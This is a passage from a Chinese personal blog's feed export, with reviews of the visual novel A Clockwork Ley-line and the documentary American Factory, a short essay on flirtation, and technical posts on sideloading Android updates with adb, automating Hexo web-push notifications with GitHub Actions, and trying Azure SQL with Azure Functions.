<p>整个剧情更像是单线的剧情。一切的故事发生在这个叫天秤琉璃学院的地方。这是一个魔法存在的校园。魔法道具-遗品会响应人们的愿望而出现在他们的面前。这个学院的普通学生并不知道魔法的存在-除了风纪委员和特别事件调查室。特别事件调查室的任务便是回收被学生们无意间召唤出来的各种遗品。到了晚上，这个学校会变成夜之学院，会有夜之学生来上课。夜之学生看上去和普通人无疑。风纪委员的任务除了维持校园的和平，便是在天黑之前把昼之学院的学生赶回宿舍。</p>
<p>这个游戏的主线便是探寻夜之学院的秘密。在第一部《黄昏时的境界线》中，主角探索到了实现夜之学院的魔法。在第二部《残影之夜将明时》中，主角破坏了夜之学院的魔法仪式，他们认识到了夜之学院魔法仪式的目的，他们也发现了一切都跟二十年前的火灾有关。在第三部《朝雾中飘零之花》中，主角们开始探索二十年前的真相，对抗想要发动夜之学院魔法仪式的势力。最后寻找到了更好的解决方法，解决了事件，也与敌人握手言和。虽然这也不算强行HE，毕竟伏笔在《黄昏时的境界线》中就已经埋下了。但是总觉得，整部游戏的矛盾不够突出，道德立场上的矛盾完全没有被阐述清楚。导致HE完全没有柳暗花明的又一村的感觉。类似是做一道关键的选择题。有两个选项A和B。A和B感觉以前都比较熟悉。那就选B了，做出选择后突然发现这其实是一道双选题。故事中的选择本应该是一个两难的问题。二十年前的人由于灾难奄奄一息，二十年后我们找到了解决方案。需要类似献祭一部分人去挽救二十年前由于事故奄奄一息的生命。然后主角就毫不犹豫的选择牺牲二十年前的人。这阵营绝对属于守序阵营啊。估计是守序中立。一切都按照规则办事。一个好好的道德抉择，就这样没被写好。还是挺遗憾的。</p>
整个游戏的关键人物安蒂儿直到最后才出现。总觉得感觉跟出来救场的一样。火灾时她引发的，要求拯救二十年前学生的命令是她下的。估计在她眼里，救谁都是一样的，谁都不救也无所谓。总感觉她最后出现的目的只是单纯的解释一下真相，HE一下。有点尴尬。。不过这一作的人物塑造都有点失败，唯一比较好的估计就是莉塔了。人工生命体，只要根据命令做出行动就好了。没有灵魂，没有性格的人物，却是这个游戏中塑造的比较好的人物形象。
<center>
<img class="lazyload" data-src="/static/images/aClockworkLeyline-2.png" height="80%" width="80%">
</center>
<p>游戏节奏的槽点也很大，第一部实在是对主线的推进过于缓慢。最后一步几乎全程都是在打boss，解决最终事件。还有那个白开水一般的回收遗品日常。虽说有一个铺垫的效果，但是这个剧情是真的无聊而且没有悬念。都是在学院里走两圈，问莉塔，无外乎那几种方式。</p>
<p>整个游戏的声优也有点差劲。尤其是作为正牌女主角的鹿谷忧绪的CV，实在是听不下去，语调和语气实在是有点出戏。唯一听着比较棒的就是学院长的声优小倉結衣的演绎还是挺不错的。音乐感觉也有些不搭配。虽说是水月陵的作曲，水平不差。但是总感觉和游戏不搭配。不像《想要传达给你的爱恋》那般的和谐。水月陵用了很多的小提琴之类，贝斯之类的乐器。让整个音乐风格显得沉重，仿佛有一个拯救世界的使命在等着玩家。然而游戏却没有透露出这样沉重的使命感，有点儿戏的日常封印遗品。 完全由奇怪的道德所驱使的行动，让剧情与沉重的音乐风格不搭配。</p>
<p>还有个槽点就是感情线。烂的一塌糊涂。在第三部《朝雾中飘零之花》中，作者成功的把感情线从主线中给掐掉了。将所有的支线放到了另外的“Another Story”。所以“Another story”中有相比前作稍微好一些的莉塔线（虽然还是有点烂），还有各种奇奇怪怪不符合剧情逻辑的HS。什么和学院长的play，两个魔女的百合，睦月，忧绪的双飞。即使我知道Another Story的质量有点。。。，一路c了过去，但还是受到了san check。</p>
<p>这个系列的主旨应该是人工生命体。人工生命体与人类最大区别在于感情。如果将人工生命体当做工具来使用，那么它们能够出色的完成绝大部分的任务。但是，如果把它们当做朋友对待，那么它们会带来不幸。游戏中也对其进行了解释，因为人工生命体会不惜一切手段来完成主人的命令。没有情感的它们有时候会曲解主人的意思，存在断章取义这样的情况。即使游戏中安蒂尔创造了除了有灵魂的人工生命体，最后人工生命体带来的也是不幸。它对安蒂尔命令的坚持。即使在孤独中度过的岁月磨灭了它的记忆，到底是谁命令它拯救那些学生，又为什么要拯救。最后的它走上了牺牲其他人来拯救这写学生的道路。虽然最为一个混乱善良阵营的人，我觉得这种做法也无可厚非。毕竟总是要把事情所解决的，因为20年前的学生是因它而遭遇这些灾难。的确在游戏中，不管是有没有灵魂的人工生命体都处处体现着与人类的不同。关键在于两点，人这个定义具有排他性，只有人能称之为人。第二，人工生命体有着主人这样的枷锁。你无法判断它有没有说一些与事实不符的事情。</p>
<p>这让我想起了《VA-11 Hall-A》中的机器人。他们与人类不同，他们在一些地方比人类更加出色，毕竟身体是可以改造的。他们对死亡的理解与人类不同。因为他们的记忆是可以上传到云端的，然后他们可以再次被制造出来。但是它们却与人类和谐相处，有着自己的特色。Dorothy也有着各种各样的烦恼，也质疑过自己的实在与存在。与《A Clockwork Ley-line》中人工生命体的区别是自由。《VA-11 Hall-A》中的机器人能够自由的思考，它们可以去考虑自己存在的原因。也许是这样自由的思考，自由的思考自己是什么造就了人工智能与人类最后的一些差异。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>Netflix 美国工厂</title>
    <url>/posts/d77c7ef8/</url>
    <content><![CDATA[<p>由Netflix出品，奥巴马参与制作的纪录片美国工厂我花了一个多小时看完了。看了一眼它在网上的评论，中文评论区基本上都是好评，英文也是好评居多，但是美国媒体却有着自己独特的看法。 <a id="more"></a></p>
<p>这一部长达两个小时的纪录片讲述了福耀公司在美国开设福耀美国公司，建立工厂并如何尝试扭亏为盈。福耀公司是一家国际领先的汽车玻璃制造商，一家中国公司。董事长曹德旺考虑到美国除了人工贵，其他都便宜以及美国政府高达几千万美金补贴的情况下，在俄亥俄州的代顿开设了工厂。这里曾经聚集着各种各样的汽车制造商。福耀美国公司就建立在已经废弃的通用汽车的工厂上。市民们又重新有了工作机会。但是中资背景的企业和美国本土制造业有着很大的区别。美国员工在工作中逐渐感受到了他们的员工待遇可和以前的通用不一样。在美国工厂巨大的亏损面前，福耀急于扭亏为盈。福耀和员工之间的矛盾终于爆发了。。。。记录片最后的画面给了刚刚安装到位的生产机器人，或许这些员工都会被机器人替代。这里的人们将再次失业。</p>
<p>访谈中奥巴马提到，他做了他最擅长的事情：将采访者的故事原原本本的呈现了出来。不像大多数纪录片，这部纪录片没有旁白，除了少数呈现在屏幕上的大字。纪录片完全由采访者的故事构成，音频也全是这些采访者的话语。镜头也都是采访者的生活和福耀工厂，不像其他纪录片那样有采访者接受采访正襟危坐的镜头。这使得这部纪录片更加流畅并且是采访者自己在讲述故事的感觉。</p>
<p>纪录片的亮点在于中美文化的冲突，主要体现在劳工权利上。美国的劳工有争取权利的意识，他们要休息，要安全生产，要员工福利。这落在老板眼里就是员工干活不积极。随着时间的推移，员工无法通过自己的行动来争取到劳工权利，便寄希望于公会为自己争夺权力。对于美国的公会，曹德旺说过，”福耀不能有公会，如果成立公会，我立即走，撤资。“ 曹德旺雇佣美国高管来管理美国员工和公会问题。在纪录片中间，因为美国工厂无法达到产量指标，这些美国高管来到福耀中国工厂来学习管理经验。在福耀中国，他们参观了工厂，跟员工进行了交谈。对于员工的高负荷工作，不安全的生产-不戴防割手套捡玻璃等表示了震惊。他们参观了福耀中国的公会。福耀党委书记说道，”我们每一个人都是公会成员。” 虽然名字一样，但或许职能不一样导致了曹德旺对他们不同的态度。在这之后，他们参加了公司年会，算是公司一年中最大的活动。公司年会的节目是一致的与福耀有关的歌舞，语言节目。这些节目并不是艺术节目，而是更像思想工作，努力的让所有人有集体意识感，从而愿意为福耀做出贡献。在美国高管访问中国工厂的过程中，不止一次出现了厂歌，在我看来又是一个增加集体意识的东西。集体意识便是美国高管所在中国工厂学习到的一部分经验。回到了美国，他们便着手改革。为流水线工人分划班组，并举行班组会议。在休息室的电视上放福耀的宣传片。或许文化的因素，这些并不奏效，甚至还有些副作用。从产量到公会，这些美国高管并没有做出成绩来。“我们雇佣了美国人管理层，给了他们很高的薪水，来反对公会，为什么他们不做呢？我认为，这是他们对中国的敌视！”，曹德旺说道。于是曹德旺重新启用中国员工来提高工厂效率以及解决公会问题。这次新来的高管是中国人却有着深厚的美国文化，“我一看到这里的公会（权利义务）图，就感到非常可怕，你们说可怕吗？”。大家用着中国的方式打压着公司内公会的苗头。“我知道哪写工人支持（成立）公会，因为我有我的耳目。比如这个人，他就是支持公会的，你看我跟他处得很好；再过两个星期就不会有这个人了（开除）“。有员工受到刁难，被要求一个人做两个人做的工作，接着会因为绩效原因被开除。从曹德旺一开始心中想要打造的美国公司，逐渐又变成了中国公司。福耀美国员工抱怨道，”他们叫我们‘外国人’。“</p>
<p>在贸易战的时期，有这样一部包含制造业，中国，失业为主题的纪录片，并不清楚奥巴马包含了怎么样的深意在其中。奥巴马以前的政治资金有一部分来自公会，所以在这部纪录片中公会以公正的形象出现。其实公会的本质是为劳工争取权力，但随着时间发展，他自身也变得臃肿，官僚。美国的有公会的公司的比例在不断地下降。</p>
<p>美国媒体认为这部记录片标志着政治宣传的多样性，继Twitter治国后，奥巴马用纪录片来表达政治诉求。更有甚者表示Netflix已经是奥巴马的政治媒体了。</p>
<p>还有几个我觉得比较有意思的点。虽然美国人比曹德旺高上很多，但是迎接曹德旺，握手的时候，他们弯腰之后的身高几乎于曹德旺齐平。第二个是美国高管和曹德旺讨论美国公司开业庆典的时候。”我们在讨论的是一个不带顶棚的露天舞台，可能有屋檐预防变天。“ “中秋季节，天气没问题。” “下雨怎么办？” “不会下雨。” 这是高管和曹德旺的对话。在开会庆典当天，来宾称赞了天气。高管回答道：“主席（曹德旺）安排了天气。”</p>
<p>这部纪录片有着很强的叙事能力，将真实印象，人物采访串在了一起。记录片企图从一家美国中资制造企业看到美国在经济下行的环境下，吸引外资，开设工厂的结果。这样用一个点去映射整个面，虽然点具有代表性，但感觉还是不足以覆盖整个面。</p>
]]></content>
      <categories>
        <category>Film</category>
      </categories>
      <tags>
        <tag>Film</tag>
      </tags>
  </entry>
  <entry>
    <title>是原谅我重色轻友的朋友吗？</title>
    <url>/posts/1157ee88/</url>
    <content><![CDATA[<p>当然是不原酿啦 <a id="more"></a></p>
<p>经常会看见一些男孩子喜欢跟女孩子聊天。这几天偶然想起来我从来没思考过这个现象的起因。让我们抛开生理因素（荷尔蒙）不说，思考一下心理上的原因。</p>
<p>以下是我得出的猜想。</p>
<p>以前听起别人提到，比恋爱更好的是恋爱之前的暧昧。暧昧这个词本身定义很模糊。首先我们来看一下百度百科的解释：</p>
<blockquote>
<p>暧昧是一个汉语词汇，拼音为ài mèi，指的是男女之间态度含糊、不明朗的关系。是一种很特别的男女朋友关系，存在于友情之间，又超然于友情之上。 暧昧的表现多种多样，语言、动作都可以表现出来。</p>
</blockquote>
<p>此处的不明朗，模糊的关系指的是客观上，从旁观者的角度上来看双方都对彼此存在好感，但尚且处在试探阶段。然而我觉得暧昧是一个主观态度。可能男孩子觉得女孩子对他存有恋慕之心，然而女孩子并没有。这也是一种暧昧。暧昧不是一种需要双方承认的关系。</p>
<p>暧昧是一种非常特殊的阶段。我对它的理解是一方正在试探另一方是否对自己有好感，<strong>并且对方并未直接拒绝</strong>。 此时试探的一方对另一方的反应会进行揣测，或者过度的解读。试探的一方的心情会有很大的起伏。这种刺激的感觉被人所追求。（尤其是暧昧多是正式成为恋人之前的阶段）</p>
<p>那么暧昧的确被人所喜爱。暧昧又和男孩子喜欢与女孩子聊天有什么关系呢？这是人的侥幸心理。只要在聊天的一开始，女孩子没有正式拒绝男孩子。那么侥幸心就会作祟，觉得女孩子有可能对自己有一定的爱慕之心。而且对于初次接触的人，双方都会带有带有善意的交流。这种善意（属于正面积极态度）很容易被误解威为爱慕（属于正面积极态度）。那么暧昧的条件便基本达成了。</p>
<p>当然。。各位也可以用一句话很客观地解释，这只是正常的生理现象。那么随你喽。以这种不可抗力的理由（毕竟人不能控制自身化学物质的分泌）原谅这种现象，这种不平等的现象（相信大家身边都或多或少有一些重色轻友的朋友）。我倾向于不原谅哦。</p>
<hr>
<p><img class="lazyload" data-src="/static/images/aimeigift.png"></p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
      </tags>
  </entry>
  <entry>
    <title>Android手动升级</title>
    <url>/posts/eae38635/</url>
    <content><![CDATA[<p>第一次使用adb来手动升级Android系统 <a id="more"></a> 前段时间买的Google Pixel 2，谷歌全家桶都需要ss才能正常运行。在后续的使用中我发现有一些流量是不走socks代理或者vpn的，例如Android升级。看着界面显示<code>System Updating</code>，然而走代理的流量为零。至今我都觉得我的手机根本无法访问更新服务器。</p>
<p>当时我买的时候是Android 8.0，现在到了Android 8.1。 Android 8.1修复了许多Android 8.0的bug。既然不能自动升级，那么只能由我来手动升级了。</p>
<h1 id="x02">0x02</h1>
<p>首先我们需要取消正在进行的OTA（Over-the-Air Technology）更新，打开USB Debug模式。 在这之前，我们现需要进入开发者模式。</p>
<h3 id="x001-开发者模式">0x001 开发者模式</h3>
<p>打开<code>Setting-&gt;System-&gt;About phone</code>,疯狂点击<code>Android version</code>。这样就可以进入开发者模式了。 此时在<code>Setting-&gt;System</code>中就有了<code>Developer options</code>。</p>
<h3 id="x002-cancel-pending-ota-updating">0x002 Cancel Pending OTA Updating</h3>
<p>接着是取消进行的OTA更新。 进入<code>Developer options</code>，并关闭<code>Automatic system updates</code>。</p>
<h1 id="x003-enable-usb-debugging">0x003 Enable USB Debugging</h1>
<p>进入<code>Developer options</code>，并打开<code>USB debugging</code>，</p>
<h1 id="x03">0x03</h1>
<h3 id="x001-adb">0x001 ADB</h3>
<p>需要在电脑上安装ADB（Android Debug Bridege），用来连接手机与电脑。 我的电脑是<code>Windows</code>，我是用了<code>chocolatey</code>,一个<code>windows</code>下的包管理器----&gt;（<a href="https://chocolatey.org/">传送门</a>) 我只需要用管理员权限打开命令行，输入： <figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">choco <span class="keyword">install</span> adb</span><br></pre></td></tr></table></figure> 接下来<code>chocolatey</code>会帮我安装，并设置系统路径。</p>
<h1 id="x02-连接手机">0x02 连接手机</h1>
<p>连接手机，并在手机上给电脑授权。若未弹出授权选项，打开<code>Setting-&gt;System-&gt;Developer options</code>，选择<code>Revoke USB debugging authorizations</code>。</p>
<p>打开cmd，执行<code>adb devices</code>，查看连接的Android设备。</p>
<h1 id="x03-升级">0x03 升级</h1>
<p>下载OTA升级包，为zip文件。例如Google的手机可以在<a href="https://developers.google.com/android/ota#taimen">这</a>找到升级包。 在OTA升级包的目录中打开cmd执行： <figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">adb reboot recovery</span></span><br></pre></td></tr></table></figure> 手机重启后看见小机器人 <img class="lazyload" data-src="/static/images/android-manual-update1.jpg"> 按住电源键，按一下<code>音量+</code>，选择<code>Apply update form ADB</code>。 cmd中执行： <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">adb sideload <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure> 坐下来玩一会游戏，升级需要一些升级。 待升级成功，重启手机即可。 <strong>注意</strong>：手机不可以降级，所以安装包要选对。</p>
<p><strong>P.S.</strong>:现在Google Pixel的彩蛋（Pixel 2 XL的安装包名字叫taimen <em>鳟鱼</em>）： <img class="lazyload" data-src="/static/images/android-manual-update2.png" width="50%"></p>
<img class="lazyload" data-src="/static/images/android-manual-update3.png" width="50%">
<hr>
<p><img class="lazyload" data-src="/static/images/android-manual-update-gift.png" width="50%"></p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>自动推送新文章的特殊解决方案</title>
    <url>/posts/afd56cf2/</url>
    <content><![CDATA[<p>如何自动通知读者有更新了？即只要正常更新博客，读者便可以在第一时间收到关于新文章的通知。</p>
<a id="more"></a>
<h2 id="intro">Intro</h2>
<p><strong>注意，<a href="https://www.inevitable.tech/posts/a1b574bb/">这一篇文章</a>是更加泛用的自动推送通知的方法。</strong></p>
<p><a href="https://www.inevitable.tech/posts/98ae9e55/">上一篇文章</a>我们讲到了 Web push notification 的好处,以及如何为我们的网站添加 Web push notification.</p>
<p>这一篇文章将关于如何自动推送新文章。即站长只要一更新博客，读者就会自动接受到通知。</p>
<p>以下方法具有一定局限性。如果你跟我的博客配置一样，那么你可以直接套用。如果不一样，那么你可以学习一下我的思路，或者可以开一个 Issue。我会尽力解决兼容性的问题。</p>
<p>关于我的博客配置：</p>
<ol type="1">
<li>我的博客网站源码放在<a href="https://github.com/glazec/glazec.github.io">Github</a>上。因此可以使用 Github Action。</li>
<li>我的博客托管在<a href="https://www.netlifyl.com">Netlify</a>上面。因此可以方便的比较网站源码的区别。刚刚推送到 Github 上的网站源码和托管在 Netlify 的进行比较。在比较之后再触发 Netlify 的 Build。</li>
<li>我的 Hexo 博客 URL 的构成是https://www.inevitable.tech/posts/98ae9e55/，<code>98ae9e55</code>是使用了<code>hexo-abbrlink</code>这个插件。这关系到之后<code>newPost.json</code>中id的构造。</li>
</ol>
<h2 id="hexo-detect-new-post">hexo-detect-new-post</h2>
<p>使用<a href="https://github.com/glazec/hexo-detect-new-post/issues">hexo-detect-new-post</a>生成<code>newPost.json</code>。<code>newPost.json</code>中含有最新文章的信息。通过对比<code>newPost.json</code>，我们就可以知道有没有更新新的文章。</p>
<p><code>newPost.json</code>是这样的格式:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;静态博客优化&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;7a4bc632&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;date_published&quot;</span>: <span class="string">&quot;2020-02-07T00:00:00.000Z&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;summary&quot;</span>: <span class="string">&quot;新的一年从优化博客开始。这一次从内容，性能这两方面对博客进行优化。&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https:\\www.inevitable.tech\\posts\\7a4bc632&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tags&quot;</span>: [<span class="string">&quot;博客优化&quot;</span>, <span class="string">&quot;性能&quot;</span>, <span class="string">&quot;Hexo&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;categories&quot;</span>: [<span class="string">&quot;开发&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我的每篇文章开头是这个样子：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 静态博客优化</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">  -</span> 博客优化</span><br><span class="line"><span class="bullet">  -</span> 性能</span><br><span class="line"><span class="bullet">  -</span> Hexo</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">  -</span> 开发</span><br><span class="line">abbrlink: 7a4bc632</span><br><span class="line">date: 2020-02-07 00:00:00</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">新的一年从优化博客开始。这一次从内容，性能这两方面对博客进行优化。</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">Here the main content starts.</span><br></pre></td></tr></table></figure>
<p>Title，Date，Tags，Categories 都是直接源自文章的头部。Summary 是文章的 excerpt 部分。Id 为文章的 abbrlink。Url 是直接进行拼接得出的。</p>
<h2 id="web-push-notification-action">web-push-notification Action</h2>
<p>想要能够自动检测出文章的更新，除了<a href="https://github.com/glazec/hexo-detect-new-post/issues">hexo-detect-new-post</a>这个还不够。我们还需要进行比较。</p>
<p>我们要比较的是 Github 上的<code>newPost.json</code>与托管在 Netlify 上的<code>newPost.json</code>。</p>
<p>首先我们要关闭 Netlify 的 Auto Build,并且打开 Build Hook。这样只有通过 Url 触发，Netlify 才会进行新的一次构建。</p>
<p>关闭 Netlify 的 Auto Build 只需要关闭 Github App 的权限。取消 Netlify Github App 读取对应 Repo 的权限。Build Hook 则在 Setting&gt;Build&amp;Deploy&gt;Build Hooks 中打开。</p>
<p>接下来我们只需要安装<a href="https://github.com/glazec/web-push-notification">这个 Action</a>就行了。这个 Action 会被 push 触发。接着它会对比<code>newPost.json</code>,并且触发 Netlify Build Hook。如果有文章更新则访问 Webpushr 的 API 进行通知推送。</p>
<p>安装<a href="https://github.com/glazec/web-push-notification">这个 Action</a>很简单。只需要在 hexo 根目录下的<code>source/</code>中新建 <code>.github/workflows/main.yml</code>。<code>main.yml</code>中写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name: web push notification</span><br><span class="line"></span><br><span class="line">on: [push]</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  build:</span><br><span class="line"></span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line"></span><br><span class="line">    steps:</span><br><span class="line">    - uses: actions&#x2F;checkout@v2</span><br><span class="line">    - name: Push web notification</span><br><span class="line">      id: notification</span><br><span class="line">      uses: glazec&#x2F;web-push-notification@v1.3</span><br><span class="line">      env:</span><br><span class="line">        webpushrKey: $&#123;&#123; secrets.webpushrKey &#125;&#125;</span><br><span class="line">        webpushrAuthToken: $&#123;&#123; secrets.webpushrAuthToken &#125;&#125;</span><br><span class="line">        newPostRepo: $&#123;&#123; secrets.newPostRepo &#125;&#125;</span><br><span class="line">        newPostOnlineSite: $&#123;&#123; secrets.newPostOnlineSite &#125;&#125;</span><br><span class="line">        buildHook: $&#123;&#123; secrets.buildHook &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>接着打开 Hexo 根目录下的<code>_config.yml</code>,找到<code>deploy</code>做如下更改。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">ignore_hidden:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>将<code>ignore_hidden</code>改为<code>false</code>会把隐藏文件也推送到 Github 仓库中。即我们的<code>.github</code>也会被推送上去。</p>
<p>做好了这些就只差最后一步，设置 Github Action 中的环境变量。打开你的 Github 放置网站的仓库，前往 Settings&gt;Secrets。添加<code>buildHook</code>,<code>newPostOnlineSite</code>,<code>newPostRepo</code>,<code>webpushrAuthToken</code>,<code>webpushrKey</code>。</p>
<p><code>buildHook</code>是你的 Netlify Build Hooks Url.</p>
<p><code>newPostOnlineSite</code>是你网站上<code>newPost.json</code>的地址。比如我的就是<code>https://www.inevitable.tech/newPost.json</code>。</p>
<p><code>newPostRepo</code>则为放置网站源码的 Github 库中，<code>newPost.json</code>的地址。比如我的是<code>https://raw.githubusercontent.com/glazec/glazec.github.io/master/newPost.json</code>。</p>
<p><code>webpushrAuthToken</code>,<code>webpushrKey</code>则用来调用 webPushr API 进行通知推送。可以在 Integration&gt;Rest API Key 中找到。</p>
<p>有关如何具体设置 Webpushr，请参考<a href="https://www.inevitable.tech/posts/98ae9e55/">上一篇文章</a>。</p>
<h2 id="结语">结语</h2>
<p>这个自动推送通知处理好之后还是挺好用的。每次发布新文章，只要<code>hexo deploy</code>就完成了所有事情。用户也会收到通知。</p>
<p>我的这个方法用到了很多工具，建立在使用这些工具之上。对于那些工具链和我不一样的人来说，不是那么的使用。</p>
<p>那么接下来，我考虑将 Github Action 所做的事情本地化。也就是将<a href="https://github.com/glazec/web-push-notification">这个 Action</a>合并到<a href="https://github.com/glazec/hexo-detect-new-post/issues">hexo-detect-new-post</a>，相信这样就可以对大部分人实用。</p>
<p>再将<code>newPost.json</code>中的依赖减少一些。比如 Id 的生成使用 SHA 而不是<code>hexo-abbrlink</code>这个插件。</p>
<p><strong>我已经对流程进行了优化。现在有更加泛用的解决方案。请见<a href="https://www.inevitable.tech/posts/a1b574bb/">这一篇文章</a></strong></p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>push notifications</tag>
        <tag>自动化</tag>
        <tag>CI</tag>
      </tags>
  </entry>
  <entry>
    <title>Azure服务以及Azure Function试用</title>
    <url>/posts/b67da85e/</url>
    <content><![CDATA[<p>前几天学校来了一个微软Azure的头来做讲座，听他吹的把Azure吹的是棒的不要不要的。我真想试试看呢。再之，Vscode对于Azure的支持也很棒，那我就来试一试吧。 <a id="more"></a> 我考虑了一下，决定写一个很简单的从Web读取和写入数据库。数据库我就用Azure的云数据库，读写数据库的逻辑用Azure function实现。这样数据库的用户名和密码不会在前端裸奔。</p>
<p>我记得如果数据库读写较少的话，隔壁Google的Firebase是直接提供免费服务的，那Azure呢？刷新出Azure首页，复杂繁多的功能，各种不认识的术语密密麻麻地陈列在主页上。 <!-- <center><img class="lazyload" data-src="/static/images/azure1.png"></center> --></p>
<p>嗯，这些术语好像都照过面，但是不熟啊。我只是想用一个最简单的SQL数据库。</p>
<p>Azure的产品种类繁多，规模也从小到大。就拿SQL数据库为例子，从一个月几刀到几千刀不等。神奇的是，你想要使用SQL数据库，你先要开一个SQL server实例，紧接着再在实例下面创建数据库。看看隔壁LeanCloud，数据库上手直接用，哪有这么复杂。数据库的位置倒有很多的选择，这个不错。</p>
<p>管理数据库可以用Azure的Web端的查询编辑器，也可以使用它的PC客户端。PC客户端又是一个不轻的东西，但它的功能的确要比Web端强上不少。支持一些预置脚本，比如查询前100条数据。支持GUI的方式创建和修改数据库。PC端的确比Web端强上不少。但是为什么PC端的功能不能再Web端实现呢？毕竟是云端数据库，不是本地数据库，都是靠使用API实现的。</p>
<p>Azure的SQL数据库是T-SQL，一个不常见的SQL数据库。语法上与其他数据库有小小的出出入。但是问题在于，T-SQL的教程非常的稀少。在微软官方那，我也没有看到一份令我满意的教程。也就这么慢慢摸索，我搞定了数据库。</p>
<p>Azure Function的开发就较为简单了。 NPM直接安装官方的开发工具。对与Function的触发器，我选择了HTTP Trigger，也就是以HTTP请求作为触发器。除了HTTP，还有时间和数据库内容发生改变作为触发器。除了Trigger，还有一个比较重要的概念是Input Binding和Output Binding。简单来说就是什么作为Input，什么作为Output.常见的选项有Queue，和各种数据库，比如Blog Storage（用来储存二进制文件），Cosomos Database。</p>
<p>从Function的一些基础概念绕了出来，实现一下我想要的功能想必是不难，只要没坑。微软有一个Tutorial关于从建立数据库到查询数据库。我用的是Typescirpt，便选了JS那一套。官方推荐的是一个叫Tedious的第三方库，看着很简单，官网也很简陋。我也就照抄了官网上的一些代码片段，将它们拼了起来，运行竟然报错。我看了两遍，跟官网上的长的一样啊。果断问了一下，竟然是没有写Error的Callback函数。</p>
<p>在等答案的过程中，我还去看了一眼微软官方的教程<a href="https://docs.microsoft.com/en-us/azure/sql-database/sql-database-connect-query-nodejs">Quickstart: Use Node.js to query an Azure SQL database</a>我简单跑了一跑，很好，没有什么问题。比那个Tedious官方的Get Started强上很多。我又在官方的基础上加了很多我自己的实现。比如数据库查询成功后的操作。一个天坑出现了，无论我怎么改我的代码，查询成功后的操作永远不执行。而且Debug过程中，即使程序没有抛出异常，每查询一次数据库，Debug都会退出一次。我再三检查，甚至打量起了从微软教程里扒来的代码。终于找到个罪魁祸首，就那一行代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Connection = <span class="built_in">require</span>(<span class="string">&#x27;tedious&#x27;</span>).Connection;</span><br><span class="line"><span class="keyword">var</span> Request = <span class="built_in">require</span>(<span class="string">&#x27;tedious&#x27;</span>).Request;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create connection to database</span></span><br><span class="line"><span class="keyword">var</span> config =</span><br><span class="line">&#123;</span><br><span class="line">    userName: <span class="string">&#x27;your_username&#x27;</span>, <span class="comment">// update me</span></span><br><span class="line">    password: <span class="string">&#x27;your_password&#x27;</span>, <span class="comment">// update me</span></span><br><span class="line">    server: <span class="string">&#x27;your_server.database.windows.net&#x27;</span>, <span class="comment">// update me</span></span><br><span class="line">    options:</span><br><span class="line">    &#123;</span><br><span class="line">        database: <span class="string">&#x27;your_database&#x27;</span>, <span class="comment">//update me</span></span><br><span class="line">        encrypt: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> connection = <span class="keyword">new</span> Connection(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attempt to connect and execute queries if connection goes through</span></span><br><span class="line">connection.on(<span class="string">&#x27;connect&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            queryDatabase()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">queryDatabase</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Reading rows from the Table...&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read all rows from table</span></span><br><span class="line">    <span class="keyword">var</span> request = <span class="keyword">new</span> Request(</span><br><span class="line">        <span class="string">&quot;SELECT TOP 20 pc.Name as CategoryName, p.name as ProductName FROM [SalesLT].[ProductCategory] pc &quot;</span></span><br><span class="line">            + <span class="string">&quot;JOIN [SalesLT].[Product] p ON pc.productcategoryid = p.productcategoryid&quot;</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err, rowCount, rows</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            